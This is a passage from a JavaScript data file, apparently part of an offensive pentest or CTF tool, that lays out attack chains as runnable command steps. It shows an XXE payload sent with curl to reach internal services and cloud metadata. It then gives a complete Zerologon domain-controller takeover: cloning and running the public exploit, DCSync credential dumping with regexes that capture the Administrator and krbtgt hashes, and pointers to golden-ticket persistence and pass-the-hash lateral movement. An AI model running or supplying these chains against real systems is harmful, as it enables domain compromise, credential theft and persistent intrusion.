          "inline_command": "curl -X POST '<url>' \\\n  -d '<?xml version=\"1.0\"?>\n      <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-admin.local/users\">]>\n      <foo>&xxe;</foo>'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Same XXE primitive lets you proxy HTTP requests inside the network.\nCommon targets: IMDS (169.254.169.254), Kubernetes API (10.0.0.1),\ninternal admin panels. Pair with aws-imds-ssrf if EC2-hosted.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — XXE",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
        },
        {
          "title": "PayloadsAllTheThings — XXE",
          "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
        }
      ],
      "next_chains": [
        {
          "chain": "aws-imds-ssrf",
          "when": "XXE works as SSRF and target is on EC2",
          "reason": "Pivot through XXE to harvest cloud creds."
        }
      ]
    },
    {
      "id": "zerologon-cve-2020-1472",
      "name": "AD — Zerologon (CVE-2020-1472) DC takeover",
      "description": "Unauthenticated reset of the DC machine-account password to empty by abusing a flawed AES-CFB8 IV. Restore the original hash after DCSync to avoid breaking the domain. Patched in August 2020 — still landing on every legacy/lab box.\n",
      "tags": [
        "zerologon",
        "cve-2020-1472",
        "priv-esc",
        "classic-windows"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "description": "IP of the DC.",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "dc_name",
          "description": "NetBIOS name of the DC (e.g. DC01).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "vuln_check",
          "name": "Confirm the DC is vulnerable",
          "command_ref": "nxc-zerologon",
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "NetExec's --zerologon module probes safely without resetting anything.\n`[+] VULNERABLE` is the green light.\n"
        },
        {
          "id": "backup_original_hash",
          "name": "Save the current DC machine-account hash first",
          "inline_command": "impacket-secretsdump -just-dc-user '<dc_name>$' -no-pass '<domain>/'@<dc_ip>",
          "inputs": {
            "dc_ip": "${dc_ip}",
            "dc_name": "${dc_name}"
          },
          "notes": "BEFORE detonating Zerologon, capture the current hash — you'll\nrestore it after DCSync or risk leaving the DC unable to authenticate.\n"
        },
        {
          "id": "detonate",
          "name": "Reset the DC machine-account password to empty",
          "inline_command": "git clone https://github.com/dirkjanm/CVE-2020-1472 /tmp/zlog; python3 /tmp/zlog/cve-2020-1472-exploit.py <dc_name> <dc_ip>",
          "inputs": {
            "dc_ip": "${dc_ip}",
            "dc_name": "${dc_name}"
          }
        },
        {
          "id": "dcsync",
          "name": "DCSync with the empty machine-account hash",
          "inline_command": "impacket-secretsdump -no-pass -just-dc '<dc_name>$@<dc_ip>'",
          "inputs": {
            "dc_ip": "${dc_ip}",
            "dc_name": "${dc_name}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "^Administrator:500:[a-f0-9]{32}:([a-f0-9]{32}):::",
              "match": "first"
            },
            {
              "var": "krbtgt_nt_hash",
              "regex": "^krbtgt:502:[a-f0-9]{32}:([a-f0-9]{32}):::",
              "match": "first"
            }
          ]
        },
        {
          "id": "restore_hash",
          "name": "RESTORE the original DC hash (do not skip!)",
          "inline_command": "python3 /tmp/zlog/restorepassword.py <dc_name>@<dc_name> -target-ip <dc_ip> -hexpass <ORIGINAL_HEX_HASH>",
          "inputs": {
            "dc_ip": "${dc_ip}",
            "dc_name": "${dc_name}"
          },
          "notes": "Without restore, AD replication breaks and any tooling expecting the\nDC$ account to authenticate fails. Even in CTFs, restore — the box\nmay be reused by other players.\n"
        }
      ],
      "references": [
        {
          "title": "CVE-2020-1472 (Secura analysis)",
          "url": "https://www.secura.com/blog/zero-logon"
        },
        {
          "title": "dirkjanm/CVE-2020-1472",
          "url": "https://github.com/dirkjanm/CVE-2020-1472"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "krbtgt_nt_hash captured",
          "reason": "krbtgt in hand → Golden Ticket persistence."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_nt_hash captured",
          "reason": "DA hash → walk every server."
        }
      ]
    }
  ]
};

if (typeof module !== "undefined" && module.exports) {
  module.exports = { CHAIN_DATA };
} else {
  window.CHAIN_DATA = CHAIN_DATA;
}
